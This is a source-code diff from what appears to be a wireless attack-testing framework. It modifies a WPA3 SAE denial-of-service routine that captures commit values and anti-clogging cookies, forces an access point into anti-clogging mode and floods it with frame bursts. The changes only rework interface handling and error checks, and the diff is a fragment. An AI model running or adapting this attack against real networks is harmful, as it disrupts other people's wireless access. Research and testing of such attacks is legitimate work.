@@ -90,7 +90,7 @@ pair<ACMCookie, int> trigger_acm(const string &iface, const string &sniff_iface,
 
 void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddress<6> &ap_mac, CookieStore &store,
 	const int attack_time_sec, const sae_helper::SAEPair &sae_params, const size_t burst_size,
-	const size_t frames_per_second_limit, const int cookie_wait_ms) {
+	const size_t frames_per_second_limit, const int /*cookie_wait_ms*/) {
 	PacketSender sender(iface);
 	log(LogLevel::INFO, "Burst phase started, duration: {}s", attack_time_sec);
 	dos_helpers::timed_burst(sender, attack_time_sec, burst_size, frames_per_second_limit, [&]() -> optional<RadioTap> {
@@ -121,6 +121,7 @@ void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddr
 void run_attack(RunStatus &rs) {
 	const ActorPtr ap = rs.get_actor("ap");
 	const ActorPtr att = rs.get_actor("attacker");
+	const ActorPtr gc = rs.get_actor("get_commit");
 
 	const auto &att_cfg = rs.config().at("attack_config");
 	const int acm_pause_millisec = att_cfg.at("acm_pause_millisec").get<int>();
@@ -130,16 +131,17 @@ void run_attack(RunStatus &rs) {
 	const size_t frames_per_sec = att_cfg.at("frames_per_second_limit").get<size_t>();
 	const int cookie_wait_ms = att_cfg.at("cookie_wait_ms").get<int>();
 
-	//TODO chcek if ap has ssid (was hardcoded before)
 	const optional<sae_helper::SAEPair> sae_params = cookie_guzzler::get_commit_values(
-		rs, att.get(SK::iface), att.get_mon_iface(), ap.get(SK::ssid), ap.get(SK::mac), 30);
+		rs, gc.get(SK::iface), att.get(SK::iface), ap.get(SK::ssid), ap.get(SK::mac), 30);
+	if(!sae_params.has_value()) throw run_err("SAE Commit capture failed");
+	hw_capabilities::run_cmd({"ip", "link", "set", gc.get(SK::iface), "down"});
 
 	//  force AP into ACM mode
 	rs.start_observers();
 	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
 	rs.process_manager.write_log_all(ATTACK_START_tag);
-	trigger_acm(att.get_mon_iface(),
-		att.get_mon_iface(),
+	trigger_acm(att.get(SK::iface),
+		att.get(SK::iface),
 		att.get(SK::mac),
 		ap.get(SK::mac),
 		acm_pause_millisec,
@@ -150,7 +152,7 @@ void run_attack(RunStatus &rs) {
 	CookieStore store;
 	thread capture_thread([&] {
 		try {
-			capture_cookies(att.get_mon_iface(), ap.get(SK::mac), store);
+			capture_cookies(att.get(SK::iface), ap.get(SK::mac), store);
 		} catch(const exception &e) {
 			log(LogLevel::ERROR, "Capture thread: {}", e.what());
 			store.stop.store(true);
@@ -158,7 +160,7 @@ void run_attack(RunStatus &rs) {
 	});
 
 	try {
-		burst_with_cookies(att.get_mon_iface(),
+		burst_with_cookies(att.get(SK::iface),
 			att.get(SK::mac),
 			ap.get(SK::mac),
 			store,
